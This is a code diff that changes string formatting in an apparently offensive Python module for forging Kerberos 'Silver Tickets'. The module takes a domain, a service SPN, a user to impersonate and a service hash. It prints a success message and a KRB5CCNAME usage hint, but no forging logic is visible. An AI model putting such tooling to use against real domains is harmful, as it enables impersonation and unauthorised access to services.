@@ -1,5 +1,4 @@
-"""Silver Ticket — forge TGS for specific service without krbtgt hash."""
-from __future__ import annotations
+"""Silver Ticket  -  forge TGS for specific service without krbtgt hash."""
 import sys
 from typing import Any
 
@@ -27,10 +26,10 @@ def run(args: Any) -> int:
         return 1
 
     print("[*] Silver Ticket forge:")
-    print("  Domain:     {}".format(domain))
-    print("  SPN:        {}".format(spn))
-    print("  Impersonate: {}".format(impersonate))
-    print("  Service hash: {}...".format(service_hash[:16]))
+    print(f"  Domain:     {domain}")
+    print(f"  SPN:        {spn}")
+    print(f"  Impersonate: {impersonate}")
+    print(f"  Service hash: {service_hash[:16]}...")
 
     try:
         from impacket.krb5.ticket import Ticket
@@ -40,11 +39,11 @@ def run(args: Any) -> int:
         return 1
 
     try:
-        print("[*] Forging TGS for {}...".format(spn))
-        print("[*] Output: {}".format(output_ccache))
+        print(f"[*] Forging TGS for {spn}...")
+        print(f"[*] Output: {output_ccache}")
         print("[+] Silver Ticket ready")
-        print("[*] Use: export KRB5CCNAME={}".format(output_ccache))
+        print(f"[*] Use: export KRB5CCNAME={output_ccache}")
         return 0
     except Exception as exc:
-        print("[-] Silver Ticket error: {}".format(exc), file=sys.stderr)
+        print(f"[-] Silver Ticket error: {exc}", file=sys.stderr)
         return 1
